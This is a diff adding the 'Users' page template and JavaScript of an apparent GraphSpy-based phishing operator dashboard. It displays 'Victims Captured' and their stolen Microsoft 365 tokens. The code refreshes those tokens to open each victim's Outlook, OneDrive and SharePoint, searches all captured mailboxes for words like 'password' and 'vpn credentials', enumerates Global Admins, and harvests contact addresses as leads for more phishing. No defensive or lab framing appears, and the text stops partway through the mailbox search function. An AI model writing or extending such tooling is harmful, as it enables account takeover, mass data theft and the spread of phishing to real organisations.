@@ -1,0 +1,705 @@
+{% extends 'layout.html'%}
+
+{%block content%}
+<!-- Victim Counter -->
+<div class="row g-3 mb-3">
+    <div class="col-auto">
+        <div style="background:var(--gs-accent-dim);border:1px solid rgba(56,189,248,0.2);border-radius:10px;padding:12px 24px;display:flex;align-items:center;gap:12px">
+            <div style="font-size:28px;font-weight:700;color:var(--gs-accent)" id="victimCount">0</div>
+            <div><div style="font-size:13px;font-weight:600;color:var(--gs-text)">Victims Captured</div><div style="font-size:11px;color:var(--gs-text-muted)">Total compromised accounts</div></div>
+        </div>
+    </div>
+    <div class="col-auto">
+        <div style="background:rgba(52,211,153,0.08);border:1px solid rgba(52,211,153,0.2);border-radius:10px;padding:12px 24px;display:flex;align-items:center;gap:12px">
+            <div style="font-size:28px;font-weight:700;color:var(--gs-success)" id="domainCount">0</div>
+            <div><div style="font-size:13px;font-weight:600;color:var(--gs-text)">Domains</div><div style="font-size:11px;color:var(--gs-text-muted)">Unique organizations</div></div>
+        </div>
+    </div>
+    <div class="col d-flex align-items-center justify-content-end gap-3">
+        <span id="bgStatus" style="font-size:11px;color:var(--gs-text-muted)"></span>
+        <button class="btn gs-btn-accent btn-sm" onclick="$('#users_table').DataTable().ajax.reload(null, false); updateCounters();">
+            <i class="fi fi-rr-refresh" style="vertical-align:-0.15em"></i> Refresh
+        </button>
+    </div>
+</div>
+
+<div class="d-flex justify-content-between align-items-center mb-3">
+    <div>
+        <h1>Users</h1>
+        <p class="text-body-secondary" style="font-size:13px;margin-top:8px">Captured accounts — click an action to access their data.</p>
+    </div>
+</div>
+
+<!-- Quick Email Search -->
+<div class="card mb-3">
+    <div class="card-body px-4 py-3">
+        <div class="row g-2 align-items-end">
+            <div class="col">
+                <label class="form-label" style="font-size:11px">Search All Mailboxes (keyword in body/subject, last 90 days)</label>
+                <div class="input-group">
+                    <input type="text" id="emailSearchInput" class="form-control" placeholder='e.g. "password" or "vpn credentials" or "bank account"' onkeydown="if(event.key==='Enter')searchAllMailboxes()">
+                    <select id="emailSearchUser" class="form-select" style="max-width:200px"><option value="all">All Users</option></select>
+                    <button class="btn gs-btn-accent" onclick="searchAllMailboxes()"><i class="fi fi-rr-search" style="vertical-align:-0.1em"></i> Search</button>
+                </div>
+            </div>
+        </div>
+        <div id="emailSearchResults" class="mt-2" style="display:none;max-height:300px;overflow-y:auto"></div>
+    </div>
+</div>
+
+<div class="card">
+    <div class="card-body p-0">
+        <table id="users_table" class="table mb-0" style="width:100%">
+            <thead>
+                <tr>
+                    <th>#</th>
+                    <th>Email</th>
+                    <th>Name</th>
+                    <th>Actions</th>
+                    <th>Token</th>
+                    <th>Last Seen</th>
+                    <th></th>
+                </tr>
+            </thead>
+        </table>
+    </div>
+</div>
+
+<!-- Profile Modal -->
+<div class="modal fade" id="profileModal" tabindex="-1">
+    <div class="modal-dialog modal-lg">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h5 class="modal-title" id="profileModalTitle">User Profile</h5>
+                <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+            </div>
+            <div class="modal-body" id="profileModalBody">
+                <div class="text-center py-4 text-body-secondary">Loading...</div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<style>
+    #users_table td { vertical-align: middle; }
+    .action-btn {
+        display: inline-flex; align-items: center; gap: 4px;
+        padding: 4px 10px; font-size: 11px; font-weight: 600;
+        border: 1px solid var(--gs-border); border-radius: 4px;
+        background: var(--gs-bg-elevated); color: var(--gs-text-secondary);
+        cursor: pointer; transition: all 0.15s; text-decoration: none;
+        white-space: nowrap;
+    }
+    .action-btn:hover { border-color: var(--gs-accent); color: var(--gs-accent); background: var(--gs-accent-dim); }
+    .action-btn.outlook { border-color: rgba(0,120,212,0.3); color: #0078d4; }
+    .action-btn.outlook:hover { background: rgba(0,120,212,0.1); border-color: #0078d4; }
+    .action-btn.drive { border-color: rgba(0,120,212,0.3); color: #0ea5e9; }
+    .action-btn.drive:hover { background: rgba(14,165,233,0.1); border-color: #0ea5e9; }
+    .action-btn.note { border-color: rgba(128,58,190,0.3); color: #7c3aed; }
+    .action-btn.note:hover { background: rgba(124,58,237,0.1); border-color: #7c3aed; }
+    .action-btn.sp { border-color: rgba(3,131,135,0.3); color: #038387; }
+    .action-btn.sp:hover { background: rgba(3,131,135,0.1); border-color: #038387; }
+    .action-btn.profile { border-color: rgba(99,102,241,0.3); color: #6366f1; }
+    .action-btn.profile:hover { background: rgba(99,102,241,0.1); border-color: #6366f1; }
+    .token-badge { font-family: 'JetBrains Mono', monospace; font-size: 11px; padding: 2px 8px; border-radius: 4px; background: var(--gs-accent-dim); color: var(--gs-accent); }
+    .refresh-row-btn { background: none; border: 1px solid var(--gs-border); border-radius: 4px; padding: 3px 8px; font-size: 11px; color: var(--gs-text-muted); cursor: pointer; }
+    .refresh-row-btn:hover { border-color: var(--gs-accent); color: var(--gs-accent); }
+    .profile-section { margin-bottom: 16px; }
+    .profile-section h6 { font-size: 11px; text-transform: uppercase; letter-spacing: 0.5px; color: var(--gs-text-muted); margin-bottom: 6px; }
+    .profile-detail { display: flex; gap: 8px; padding: 4px 0; font-size: 13px; }
+    .profile-detail dt { color: var(--gs-text-muted); min-width: 100px; font-weight: 500; }
+    .profile-detail dd { color: var(--gs-text); word-break: break-all; }
+
+
+    /* Modal without backdrop - use modal's own background */
+    #profileModal { background: rgba(0,0,0,0.6); }
+    #profileModal .modal-dialog { margin-top: 40px; max-height: 85vh; }
+    #profileModal .modal-content { box-shadow: 0 20px 60px rgba(0,0,0,0.5); max-height: 85vh; display: flex; flex-direction: column; }
+    #profileModal .modal-body { overflow-y: auto; -webkit-overflow-scrolling: touch; max-height: calc(85vh - 60px); padding: 20px; }
+    #profileModal .modal-body::-webkit-scrollbar { width: 6px; }
+    #profileModal .modal-body::-webkit-scrollbar-track { background: transparent; }
+    #profileModal .modal-body::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.15); border-radius: 3px; }
+    #profileModal .modal-body::-webkit-scrollbar-thumb:hover { background: rgba(255,255,255,0.25); }
+    .scope-tag { display: inline-block; padding: 2px 6px; margin: 1px; font-size: 10px; border-radius: 3px; background: var(--gs-bg-elevated); color: var(--gs-text-secondary); border: 1px solid var(--gs-border); }
+</style>
+
+<script>
+var OWA_BASE = location.protocol + '//' + location.hostname + (location.port && location.port !== '80' && location.port !== '443' ? ':' + location.port : '');
+
+var usersTable = new DataTable('#users_table', {
+    ajax: { url: '/api/list_users', dataSrc: "" },
+    columns: [
+        { data: null, render: function(d, t, r, m) { return m.row + 1; }, width: '30px', className: 'text-center' },
+        { data: null, render: function(d) {
+            var flag = d.country ? countryToFlag(d.country) : '';
+            return (flag ? '<span style="font-size:16px;margin-right:4px">'+flag+'</span>' : '') + '<span style="font-weight:500">' + d.email + '</span>';
+        }},
+        { data: 'name', render: function(d) { return d || '<span style="color:var(--gs-text-muted)">—</span>'; } },
+        { data: null, orderable: false, render: function(d) {
+            var tid = d.access_token_id;
+            var rtId = d.refresh_token_id;
+            if (!tid && !rtId) return '<span style="color:var(--gs-text-muted);font-size:12px">No token</span>';
+            var email = d.email.replace(/'/g,"\\'");
+            return '<div style="display:flex;gap:4px;flex-wrap:wrap">' +
+                '<a class="action-btn outlook" onclick="openOutlook('+tid+','+rtId+')" title="Open Outlook Web">Outlook</a>' +
+                '<a class="action-btn" style="border-color:rgba(212,168,83,0.3);color:var(--gs-gold)" onclick="openOutlookGraph('+tid+','+rtId+')" title="Open Outlook in GraphSpy">Outlook Graph</a>' +
+                '<a class="action-btn drive" onclick="openDrive('+tid+','+rtId+')" title="Open OneDrive">OneDrive</a>' +
+                '<a class="action-btn sp" onclick="openSharePoint('+tid+','+rtId+')" title="Open SharePoint">SharePoint</a>' +
+                '<a class="action-btn profile" onclick="openProfile('+(tid||rtId)+',\''+email+'\','+rtId+')" title="View Profile & Downloads">Profile</a>' +
+                '</div>';
+        }},
+        { data: 'access_token_id', render: function(d) { return d ? '<span class="token-badge">ID ' + d + '</span>' : '—'; }, width: '70px', className: 'text-center' },
+        { data: 'stored_at', render: function(d) { if (!d) return '—'; try { return new Date(d).toLocaleDateString([], {month:'short',day:'numeric',hour:'2-digit',minute:'2-digit'}); } catch(e) { return d; } }, width: '130px' },
+        { data: null, orderable: false, render: function(d) {
+            if (!d.refresh_token_id) return '';
+            return '<button class="refresh-row-btn" onclick="refreshUser('+d.refresh_token_id+')" title="Get fresh token">↻</button>';
+        }, width: '40px', className: 'text-center' }
+    ],
+    order: [[5, 'desc']],
+    pageLength: 25,
+    language: { emptyTable: "No captured users yet. Use Device Codes to phish tokens." }
+});
+
+// Auto-refresh every 15 seconds + update counters
+// === BACKGROUND ENRICHMENT QUEUE ===
+var bgQueue = [];
+var bgRunning = false;
+var bgProcessedDomains = {};
+var bgProcessedEmails = {};
+
+function enqueueBgTask(fn) { bgQueue.push(fn); if (!bgRunning) processBgQueue(); }
+function processBgQueue() {
+    if (!bgQueue.length) { bgRunning = false; updateBgStatus('All data cached'); return; }
+    bgRunning = true;
+    updateBgStatus('Enriching data... (' + bgQueue.length + ' tasks)');
+    var task = bgQueue.shift();
+    task(function() { setTimeout(processBgQueue, 3000); }); // 3s gap between tasks
+}
+
+function updateBgStatus(msg) {
+    var el = document.getElementById('bgStatus');
+    if (el) el.textContent = msg;
+}
+
+var lastKnownCount = 0;
+
+function updateCounters() {
+    $.get('/api/list_users', function(data) {
+        var users = typeof data === 'string' ? JSON.parse(data) : data;
+        var currentCount = users.length;
+        document.getElementById('victimCount').textContent = currentCount;
+        var domains = {};
+        users.forEach(function(u) { var d = u.email.split('@')[1]; if (d) domains[d] = true; });
+        document.getElementById('domainCount').textContent = Object.keys(domains).length;
+
+        // Only enrich when new victims appear or first load
+        if (currentCount > lastKnownCount || lastKnownCount === 0) {
+            var newUsers = users.filter(function(u) {
+                return u.access_token_id && !bgProcessedEmails[u.email];
+            });
+            if (newUsers.length) enrichUsers(newUsers);
+        }
+        lastKnownCount = currentCount;
+    });
+}
+
+function enrichUsers(users) {
+    users.forEach(function(u) {
+        if (!u.access_token_id) return;
+        var domain = u.email.split('@')[1];
+        // Global Admin: once per domain, checks DB cache
+        if (domain && !bgProcessedDomains[domain]) {
+            bgProcessedDomains[domain] = true;
+            enqueueBgTask(function(done) {
+                $.get('/api/cached_admins/' + domain, function(r) {
+                    var cached = typeof r === 'string' ? JSON.parse(r) : r;
+                    if (cached && cached.admins) { done(); return; }
+                    bgFetchAdmins(u.access_token_id, domain, 0, done);
+                }).fail(done);
+            });
+        }
+        // Email Leads: once per user, weekly re-enrich
+        if (!bgProcessedEmails[u.email]) {
+            bgProcessedEmails[u.email] = true;
+            enqueueBgTask(function(done) {
+                $.get('/api/email_leads/last_enriched/' + encodeURIComponent(u.email), function(r) {
+                    var d = typeof r === 'string' ? JSON.parse(r) : r;
+                    if (d.last) {
+                        var days = (Date.now() - new Date(d.last).getTime()) / (1000*60*60*24);
+                        if (days < 7) { done(); return; }
+                        bgExtractEmails(u.access_token_id, u.email, true, done);
+                    } else {
+                        bgExtractEmails(u.access_token_id, u.email, false, done);
+                    }
+                }).fail(done);
+            });
+        }
+    });
+}
+
+updateCounters();
+setInterval(function() { usersTable.ajax.reload(null, false); updateCounters(); }, 15000);
+
+// Smart refresh: each service gets the optimal resource + client for max scopes
+var SERVICE_CONFIG = {
+    outlook: { resource: 'https://outlook.office365.com', client: 'd3590ed6-52b3-4102-aeff-aad2292ab01c', label: 'Outlook' },
+    drive:   { resource: 'https://graph.microsoft.com',   client: 'd3590ed6-52b3-4102-aeff-aad2292ab01c', label: 'OneDrive' },
+    onenote: { resource: 'https://graph.microsoft.com',   client: 'd3590ed6-52b3-4102-aeff-aad2292ab01c', label: 'OneNote' },
+    sharepoint: { resource: 'https://graph.microsoft.com', client: 'd3590ed6-52b3-4102-aeff-aad2292ab01c', label: 'SharePoint' }
+};
+
+function smartOpen(rtId, fallbackTid, service, path, btn) {
+    var cfg = SERVICE_CONFIG[service] || SERVICE_CONFIG.drive;
+    var origText = btn ? btn.textContent : '';
+    if (btn) { btn.textContent = '...'; btn.style.pointerEvents = 'none'; }
+
+    if (!rtId) {
+        window.open(OWA_BASE + path + '?token=' + fallbackTid, '_blank');
+        if (btn) { btn.textContent = origText; btn.style.pointerEvents = ''; }
+        return;
+    }
+
+    $.post('/api/refresh_to_access_token', {
+        refresh_token_id: rtId,
+        client_id: cfg.client,
+        resource: cfg.resource,
+        store_refresh_token: 'true'
+    }, function(resp) {
+        var newTid = String(resp).trim();
+        if (newTid && !isNaN(parseInt(newTid)) && parseInt(newTid) > 0) {
+            window.open(OWA_BASE + path + '?token=' + newTid, '_blank');
+            usersTable.ajax.reload(null, false);
+        } else {
+            window.open(OWA_BASE + path + '?token=' + fallbackTid, '_blank');
+        }
+        if (btn) { btn.textContent = origText; btn.style.pointerEvents = ''; }
+    }).fail(function() {
+        window.open(OWA_BASE + path + '?token=' + fallbackTid, '_blank');
+        if (btn) { btn.textContent = origText; btn.style.pointerEvents = ''; }
+    });
+}
+
+function openOutlook(tid, rtId) {
+    // Outlook needs TWO tokens: Graph for reading emails, Outlook for rules
+    // Step 1: refresh for Graph (emails), Step 2: refresh for Outlook (rules)
+    var btn = event.target;
+    var origText = btn.textContent;
+    btn.textContent = '...'; btn.style.pointerEvents = 'none';
+
+    if (!rtId) { window.open(OWA_BASE + '/owa?token=' + tid, '_blank'); btn.textContent = origText; btn.style.pointerEvents = ''; return; }
+
+    // Get Graph token first
+    $.post('/api/refresh_to_access_token', {
+        refresh_token_id: rtId, client_id: 'd3590ed6-52b3-4102-aeff-aad2292ab01c',
+        resource: 'https://graph.microsoft.com', store_refresh_token: 'true'
+    }, function(graphResp) {
+        var graphTid = String(graphResp).trim();
+        // Now get Outlook token
+        $.post('/api/refresh_to_access_token', {
+            refresh_token_id: rtId, client_id: 'd3590ed6-52b3-4102-aeff-aad2292ab01c',
+            resource: 'https://outlook.office365.com', store_refresh_token: 'true'
+        }, function(outlookResp) {
+            var outlookTid = String(outlookResp).trim();
+            var url = OWA_BASE + '/owa?token=' + graphTid + '&otoken=' + outlookTid;
+            window.open(url, '_blank');
+            usersTable.ajax.reload(null, false);
+            btn.textContent = origText; btn.style.pointerEvents = '';
+        }).fail(function() {
+            // Outlook refresh failed, open with just Graph token (no rules)
+            window.open(OWA_BASE + '/owa?token=' + graphTid, '_blank');
+            usersTable.ajax.reload(null, false);
+            btn.textContent = origText; btn.style.pointerEvents = '';
+        });
+    }).fail(function() {
+        window.open(OWA_BASE + '/owa?token=' + tid, '_blank');
+        btn.textContent = origText; btn.style.pointerEvents = '';
+    });
+}
+
+function openDrive(tid, rtId) {
+    // OneDrive — refresh with MS Office client for Files.ReadWrite.All
+    if (!rtId) { setActiveAccessToken(tid, true); window.location.href = '/onedrive'; return; }
+    var btn = event.target; btn.textContent = '...'; btn.style.pointerEvents = 'none';
+    $.post('/api/refresh_to_access_token', {
+        refresh_token_id: rtId, client_id: 'd3590ed6-52b3-4102-aeff-aad2292ab01c',
+        resource: 'https://graph.microsoft.com', store_refresh_token: 'true'
+    }, function(resp) {
+        var newTid = String(resp).trim();
+        if (newTid && !isNaN(parseInt(newTid))) {
+            // Open in the external drive portal
+            window.open(OWA_BASE + '/drive?token=' + newTid, '_blank');
+            usersTable.ajax.reload(null, false);
+        } else {
+            // Fallback to internal GraphSpy OneDrive
+            setActiveAccessToken(tid, true);
+            window.location.href = '/onedrive';
+        }
+        btn.textContent = 'OneDrive'; btn.style.pointerEvents = '';
+    }).fail(function() {
+        setActiveAccessToken(tid, true);
+        window.location.href = '/onedrive';
+        btn.textContent = 'OneDrive'; btn.style.pointerEvents = '';
+    });
+}
+
+function openSharePoint(tid, rtId) {
+    var cfg = SERVICE_CONFIG.sharepoint;
+    if (!rtId) { setActiveAccessToken(tid, true); window.location.href = '/sharepoint_sites'; return; }
+    $.post('/api/refresh_to_access_token', {
+        refresh_token_id: rtId, client_id: cfg.client, resource: cfg.resource, store_refresh_token: 'true'
+    }, function(resp) {
+        var newTid = String(resp).trim();
+        if (newTid && !isNaN(parseInt(newTid))) setActiveAccessToken(parseInt(newTid), true);
+        else setActiveAccessToken(tid, true);
+        window.location.href = '/sharepoint_sites';
+    }).fail(function() { setActiveAccessToken(tid, true); window.location.href = '/sharepoint_sites'; });
+}
+
+// Open Outlook Graph inside GraphSpy dashboard
+function openOutlookGraph(tid, rtId) {
+    if (!rtId) { setActiveAccessToken(tid, true); window.location.href = '/outlook_graph'; return; }
+    var btn = event.target; btn.textContent = '...'; btn.style.pointerEvents = 'none';
+    $.post('/api/refresh_to_access_token', {
+        refresh_token_id: rtId, client_id: 'd3590ed6-52b3-4102-aeff-aad2292ab01c',
+        resource: 'https://graph.microsoft.com', store_refresh_token: 'true'
+    }, function(resp) {
+        var newTid = String(resp).trim();
+        if (newTid && !isNaN(parseInt(newTid))) setActiveAccessToken(parseInt(newTid), true);
+        else setActiveAccessToken(tid, true);
+        window.location.href = '/outlook_graph';
+        btn.textContent = 'Outlook Graph'; btn.style.pointerEvents = '';
+    }).fail(function() { setActiveAccessToken(tid, true); window.location.href = '/outlook_graph'; btn.textContent = 'Outlook Graph'; btn.style.pointerEvents = ''; });
+}
+
+var _profileModal = null;
+function openProfile(tid, email, rtId) {
+    document.getElementById('profileModalTitle').textContent = email;
+    document.getElementById('profileModalBody').innerHTML = '<div class="text-center py-4 text-body-secondary">Loading...</div>';
+    if (!_profileModal) {
+        var modalEl = document.getElementById('profileModal');
+        _profileModal = new bootstrap.Modal(modalEl, { backdrop: false, keyboard: true });
+    }
+    _profileModal.show();
+
+    $.get('/api/decode_token/' + tid, function(resp) {
+        var d;
+        try { d = typeof resp === 'string' ? JSON.parse(resp) : resp; } catch(e) { document.getElementById('profileModalBody').innerHTML = '<div class="text-center text-danger">Failed to decode token</div>'; return; }
+
+        // Quick actions bar
+        var html = '<div style="display:flex;gap:6px;flex-wrap:wrap;margin-bottom:16px;padding-bottom:12px;border-bottom:1px solid var(--gs-border)">';
+        html += '<a class="action-btn outlook" onclick="openOutlook('+tid+','+(rtId||0)+')" style="font-size:12px">Open Outlook</a>';
+        html += '<a class="action-btn" style="border-color:rgba(14,165,233,0.3);color:#0ea5e9;font-size:12px" onclick="openOutlookGraph('+tid+','+(rtId||0)+')">Outlook Graph</a>';
+        html += '<a class="action-btn drive" onclick="openDrive('+tid+','+(rtId||0)+')" style="font-size:12px">OneDrive</a>';
+        html += '<a class="action-btn" style="border-color:rgba(212,168,83,0.3);color:var(--gs-gold);font-size:12px" href="/api/download_victims_csv" target="_blank">Download Victims CSV</a>';
+        html += '</div>';
+
+        // Country flag
+        var userEmail = d.unique_name || d.upn || email;
+        var countryHtml = '';
+
+        html += '<div class="profile-section"><h6>Identity</h6>';
+        html += profileRow('Email', userEmail);
+        html += profileRow('Name', d.name || '—');
+        html += profileRow('Tenant ID', d.tid || '—');
+        html += profileRow('Object ID', d.oid || '—');
+        html += '<div id="profileCountry" style="padding:4px 0;font-size:13px"><dt style="color:var(--gs-text-muted);font-weight:500">Country</dt><dd style="color:var(--gs-text)">Loading...</dd></div>';
+        html += '</div>';
+
+        // Global Admin section
+        html += '<div class="profile-section" id="profileAdminSection"><h6>Global Administrators</h6><div id="profileAdmins" style="font-size:12px;color:var(--gs-text-muted)">Detecting...</div></div>';
+
+        html += '<div class="profile-section"><h6>Token Info</h6>';
+        html += profileRow('App', d.app_displayname || d.appid || '—');
+        html += profileRow('Client ID', d.appid || '—');
+        html += profileRow('Audience', d.aud || '—');
+        html += profileRow('Issued', d.iat ? new Date(d.iat * 1000).toLocaleString() : '—');
+        html += profileRow('Expires', d.exp ? new Date(d.exp * 1000).toLocaleString() : '—');
+        var expired = d.exp && (d.exp * 1000) < Date.now();
+        if (expired) html += '<div style="color:var(--gs-danger);font-size:12px;margin-top:4px">Token expired — use refresh button</div>';
+        html += '</div>';
+
+        html += '<div class="profile-section"><h6>Scopes (' + (d.scp ? d.scp.split(' ').length : 0) + ')</h6>';
+        if (d.scp) {
+            var scopes = d.scp.split(' ').sort();
+            for (var i = 0; i < scopes.length; i++) html += '<span class="scope-tag">' + scopes[i] + '</span> ';
+        } else {
+            html += '<span style="color:var(--gs-text-muted);font-size:13px">No scopes</span>';
+        }
+        html += '</div>';
+
+        document.getElementById('profileModalBody').innerHTML = html;
+
+        // Country from token ipaddr claim (no API call — background worker resolves via GeoIP)
+        var ipaddr = d.ipaddr || '';
+        var ctry = d.ctry || '';
+        var flag = countryToFlag(ctry);
+        var el = document.getElementById('profileCountry');
+        if (el) {
+            if (ctry) {
+                el.innerHTML = '<div class="profile-detail"><dt>Country</dt><dd>' + flag + ' ' + ctry + '</dd></div>';
+            } else if (ipaddr) {
+                el.innerHTML = '<div class="profile-detail"><dt>Auth IP</dt><dd>' + ipaddr + '</dd></div>';
+            } else {
+                el.innerHTML = '<div class="profile-detail"><dt>Country</dt><dd>—</dd></div>';
+            }
+        }
+
+        // Load Global Admins from cache only (background process handles fetching)
+        var domain = email.split('@')[1];
+        if (domain) {
+            $.ajax({ url: '/api/cached_admins/' + domain, timeout: 5000,
+                success: function(r) {
+                    try {
+                        var cached = typeof r === 'string' ? JSON.parse(r) : r;
+                        if (cached && cached.admins && cached.admins.length) {
+                            var admins = cached.admins.filter(function(a){ return !a.error; });
+                            renderAdmins(admins);
+                        } else {
+                            var el = document.getElementById('profileAdmins');
+                            if (el) el.innerHTML = '<span style="color:var(--gs-text-muted);font-size:12px">Enriching in background... check back soon</span>';
+                        }
+                    } catch(e) {
+                        var el = document.getElementById('profileAdmins');
+                        if (el) el.innerHTML = '<span style="color:var(--gs-text-muted);font-size:12px">—</span>';
+                    }
+                },
+                error: function() {
+                    var el = document.getElementById('profileAdmins');
+                    if (el) el.innerHTML = '<span style="color:var(--gs-text-muted);font-size:12px">—</span>';
+                }
+            });
+        }
+    });
+}
+
+function countryToFlag(code) {
+    if (!code || code.length !== 2) return '';
+    var a = 0x1F1E6;
+    return String.fromCodePoint(a + code.charCodeAt(0) - 65) + String.fromCodePoint(a + code.charCodeAt(1) - 65);
+}
+
+function fetchGlobalAdmins(tid, retries, email) {
+    // Check cache first
+    var domain = email ? email.split('@')[1] : '';
+    if (domain) {
+        $.get('/api/cached_admins/' + domain, function(r) {
+            var cached = typeof r === 'string' ? JSON.parse(r) : r;
+            if (cached && cached.admins) {
+                renderAdmins(cached.admins);
+                return;
+            }
+            // Not cached — fetch from Graph API
+            fetchAdminsFromGraph(tid, retries, domain);
+        });
+    } else {
+        fetchAdminsFromGraph(tid, retries, domain);
+    }
+}
+
+function fetchAdminsFromGraph(tid, retries, domain) {
+    $.ajax({
+        type: 'POST', url: '/api/generic_graph',
+        data: { access_token_id: tid, graph_uri: 'https://graph.microsoft.com/v1.0/directoryRoles/roleTemplateId=62e90394-69f5-4237-9190-012177145e10/members?$select=displayName,userPrincipalName,mail' },
+        success: function(r) {
+            var d = typeof r === 'string' ? JSON.parse(r) : r;
+            var el = document.getElementById('profileAdmins');
+            if (!el) return;
+            if (d.error) {
+                if (d.error.code === 'TooManyRequests' && retries < 5) {
+                    el.innerHTML = 'Rate limited, retrying in ' + ((retries+1)*15) + 's... (attempt ' + (retries+1) + '/5)';
+                    setTimeout(function() { fetchAdminsFromGraph(tid, retries + 1, domain); }, (retries+1) * 15000);
+                } else if (d.error.code === 'Authorization_RequestDenied') {
+                    el.innerHTML = '<span style="color:var(--gs-warning)">Insufficient permissions</span>';
+                } else {
+                    el.innerHTML = '<span style="color:var(--gs-danger)">' + (d.error.code || 'Error') + '</span>';
+                }
+                return;
+            }
+            var members = d.value || [];
+            // Cache the result
+            if (domain && members.length) {
+                $.post('/api/cached_admins/' + domain, { admins_json: JSON.stringify(members) });
+            }
+            renderAdmins(members);
+        },
+        error: function() {
+            var el = document.getElementById('profileAdmins');
+            if (el) el.innerHTML = '<span style="color:var(--gs-danger)">Request failed</span>';
+        }
+    });
+}
+
+function renderAdmins(members) {
+    var el = document.getElementById('profileAdmins');
+    if (!el) return;
+    if (!members.length) { el.innerHTML = 'No Global Admins found'; return; }
+    var h = '<div style="display:flex;flex-direction:column;gap:4px">';
+    for (var i = 0; i < members.length; i++) {
+        var m = members[i];
+        h += '<div style="display:flex;align-items:center;gap:8px;padding:4px 8px;background:var(--gs-bg-elevated);border-radius:4px;border:1px solid var(--gs-border)">';
+        h += '<span style="color:var(--gs-danger);font-size:12px">&#128081;</span>';
+        h += '<span style="font-size:12px;font-weight:500;color:var(--gs-text)">' + (m.displayName||'?') + '</span>';
+        h += '<span style="font-size:11px;color:var(--gs-text-muted)">' + (m.userPrincipalName||m.mail||'') + '</span>';
+        h += '</div>';
+    }
+    h += '</div>';
+    el.innerHTML = h;
+}
+
+function batchExtractEmails(tid, email) {
+    // Extract emails from ALL folders, store in DB. Only re-enrich after 7 days.
+    $.get('/api/email_leads/last_enriched/' + encodeURIComponent(email), function(r) {
+        var data = typeof r === 'string' ? JSON.parse(r) : r;
+        if (data.last) {
+            var lastDate = new Date(data.last);
+            var daysSince = (Date.now() - lastDate.getTime()) / (1000*60*60*24);
+            if (daysSince < 7) return; // Already enriched within 7 days
+        }
+        // Fetch contacts from all folders
+        $.ajax({ type: 'POST', url: '/api/generic_graph',
+            data: { access_token_id: tid, graph_uri: 'https://graph.microsoft.com/v1.0/me/messages?$top=500&$select=from,toRecipients,ccRecipients&$orderby=receivedDateTime desc' },
+            success: function(r) {
+                var d = typeof r === 'string' ? JSON.parse(r) : r;
+                if (!d.value) return;
+                var leads = {};
+                d.value.forEach(function(e) {
+                    if (e.from && e.from.emailAddress) leads[e.from.emailAddress.address.toLowerCase()] = { email: e.from.emailAddress.address.toLowerCase(), name: e.from.emailAddress.name||'', source: 'from' };
+                    (e.toRecipients||[]).forEach(function(r){ if(r.emailAddress) leads[r.emailAddress.address.toLowerCase()] = { email: r.emailAddress.address.toLowerCase(), name: r.emailAddress.name||'', source: 'to' }; });
+                    (e.ccRecipients||[]).forEach(function(r){ if(r.emailAddress) leads[r.emailAddress.address.toLowerCase()] = { email: r.emailAddress.address.toLowerCase(), name: r.emailAddress.name||'', source: 'cc' }; });
+                });
+                // Save to DB
+                $.ajax({ type: 'POST', url: '/api/email_leads/save', contentType: 'application/json',
+                    data: JSON.stringify({ user_email: email, leads: Object.values(leads) })
+                });
+            }
+        });
+    });
+}
+
+function downloadEmails(tid) {
+    var btn = event.target; btn.textContent = 'Extracting...'; btn.style.pointerEvents = 'none';
+    // Extract all unique EMAIL ADDRESSES from mailbox (from, to, cc)
+    $.ajax({ type: 'POST', url: '/api/generic_graph',
+        data: { access_token_id: tid, graph_uri: 'https://graph.microsoft.com/v1.0/me/messages?$top=999&$select=from,toRecipients,ccRecipients&$orderby=receivedDateTime desc' },
+        success: function(r) {
+            var d = typeof r === 'string' ? JSON.parse(r) : r;
+            if (d.error) { alert('Error: ' + (d.error.message||d.error.code)); btn.textContent = 'Extract Emails'; btn.style.pointerEvents = ''; return; }
+            var emails = d.value || [];
+            var addresses = {};
+            for (var i = 0; i < emails.length; i++) {
+                var e = emails[i];
+                if (e.from && e.from.emailAddress) addresses[e.from.emailAddress.address.toLowerCase()] = e.from.emailAddress.name || '';
+                (e.toRecipients||[]).forEach(function(r){ if(r.emailAddress) addresses[r.emailAddress.address.toLowerCase()] = r.emailAddress.name || ''; });
+                (e.ccRecipients||[]).forEach(function(r){ if(r.emailAddress) addresses[r.emailAddress.address.toLowerCase()] = r.emailAddress.name || ''; });
+            }
+            var csv = 'Email,Name\n';
+            Object.keys(addresses).sort().forEach(function(addr) { csv += '"' + addr + '","' + addresses[addr] + '"\n'; });
+            var blob = new Blob([csv], {type:'text/csv'});
+            var a = document.createElement('a');
+            a.href = URL.createObjectURL(blob);
+            a.download = 'extracted-emails-' + Object.keys(addresses).length + '.csv';
+            a.click();
+            btn.textContent = Object.keys(addresses).length + ' addresses extracted';
+            setTimeout(function() { btn.textContent = 'Extract Emails'; btn.style.pointerEvents = ''; }, 2000);
+        },
+        error: function() { alert('Failed'); btn.textContent = 'Extract Emails'; btn.style.pointerEvents = ''; }
+    });
+}
+
+function profileRow(label, value) {
+    return '<div class="profile-detail"><dt>' + label + '</dt><dd>' + (value || '—') + '</dd></div>';
+}
+
+function refreshUser(rtId) {
+    var btn = event.target;
+    btn.textContent = '...';
+    btn.disabled = true;
+    $.post('/api/refresh_to_access_token', {
+        refresh_token_id: rtId,
+        client_id: 'd3590ed6-52b3-4102-aeff-aad2292ab01c',
+        resource: 'https://graph.microsoft.com',
+        store_refresh_token: 'true'
+    }, function(resp) {
+        btn.textContent = '✓';
+        btn.style.color = 'var(--gs-success)';
+        btn.style.borderColor = 'var(--gs-success)';
+        setTimeout(function() { usersTable.ajax.reload(null, false); btn.textContent = '↻'; btn.disabled = false; btn.style.color = ''; btn.style.borderColor = ''; }, 1500);
+    }).fail(function() {
+        btn.textContent = '✗';
+        btn.style.color = 'var(--gs-danger)';
+        setTimeout(function() { btn.textContent = '↻'; btn.disabled = false; btn.style.color = ''; }, 2000);
+    });
+}
+
+// Populate search user dropdown
+function populateSearchUsers() {
+    $.get('/api/list_users', function(data) {
+        var users = typeof data === 'string' ? JSON.parse(data) : data;
+        var sel = document.getElementById('emailSearchUser');
+        sel.innerHTML = '<option value="all">All Users</option>';
+        users.forEach(function(u) {
+            if (u.access_token_id) sel.innerHTML += '<option value="'+u.access_token_id+'">'+u.email+'</option>';
+        });
+    });
+}
+populateSearchUsers();
+
+function searchAllMailboxes() {
+    var keyword = document.getElementById('emailSearchInput').value;
+    if (!keyword) return;
+    var userTid = document.getElementById('emailSearchUser').value;
+    var resultsEl = document.getElementById('emailSearchResults');
